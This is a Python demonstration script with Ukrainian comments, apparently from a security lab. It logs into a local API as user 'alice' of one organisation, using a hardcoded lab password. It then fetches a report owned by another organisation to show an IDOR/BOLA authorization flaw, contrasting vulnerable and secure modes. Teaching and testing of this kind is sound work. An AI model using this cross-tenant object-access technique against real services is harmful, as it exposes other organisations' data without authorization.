#!/usr/bin/env python3
"""
Демонстрація IDOR/BOLA без браузера: логін як alice (org 1), потім GET /api/reports/201
(звіт org 2). У режимі vulnerable — 200 і витік полів; у secure — 403.

Запуск після `docker compose up` (API на http://127.0.0.1:23456):
  python scripts/bola_attack_demo.py

Змінна середовища API_BASE (за замовчуванням http://127.0.0.1:23456).
"""

from __future__ import annotations

import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request

API_BASE = os.environ.get("API_BASE", "http://127.0.0.1:23456").rstrip("/")
ALICE_USER = "alice"
ALICE_PASS = os.environ.get("ALICE_PASSWORD", "K7m!pQ2$vL9#")
TARGET_REPORT_ID = int(os.environ.get("TARGET_REPORT_ID", "201"))


def post_form(url: str, data: dict[str, str]) -> tuple[int, bytes]:
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=30) as resp:
        return resp.status, resp.read()


def get_json(url: str, token: str | None = None) -> tuple[int, object]:
    headers: dict[str, str] = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            raw = resp.read()
            return resp.status, json.loads(raw.decode() or "{}")
    except urllib.error.HTTPError as e:
        raw = e.read()
        try:
            payload = json.loads(raw.decode() or "{}")
        except json.JSONDecodeError:
            payload = {"detail": raw.decode(errors="replace")}
        return e.code, payload


def main() -> int:
    print(f"API: {API_BASE}")
    login_url = f"{API_BASE}/api/auth/login"
    try:
        status, raw = post_form(
            login_url,
            {
                "username": ALICE_USER,
                "password": ALICE_PASS,
                "grant_type": "password",
            },
        )
    except urllib.error.URLError as e:
        print("Не вдалося з'єднатися з API. Запущено docker compose? Помилка:", e, file=sys.stderr)
        return 1
    if status != 200:
        print("Логін не вдався:", status, raw.decode(errors="replace"), file=sys.stderr)
        return 1
    token_payload = json.loads(raw.decode())
    token = token_payload.get("access_token")
    if not token:
        print("Немає access_token у відповіді", file=sys.stderr)
        return 1

    me_status, me = get_json(f"{API_BASE}/api/auth/me", token)
    print("GET /api/auth/me ->", me_status, json.dumps(me, ensure_ascii=False))

    detail_url = f"{API_BASE}/api/reports/{TARGET_REPORT_ID}"
    st, report = get_json(detail_url, token)
    print(f"GET /api/reports/{TARGET_REPORT_ID} ->", st)
    print(json.dumps(report, ensure_ascii=False, indent=2))

    if st == 200 and isinstance(report, dict):
        rid = report.get("org_id")
        if rid == 2:
            print(
                "\n[!] BOLA: alice (org 1) отримала об'єкт іншої організації — вразливий режим або некоректна авторизація."
            )
        else:
            print("\n[OK] Об'єкт належить очікуваній організації.")
    elif st == 403:
        print("\n[OK] Доступ заборонено — типова відповідь у secure-режимі.")
    else:
        print("\n[?] Неочікуваний статус; перевірте REPORTS_AUTHZ_MODE та дані БД.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
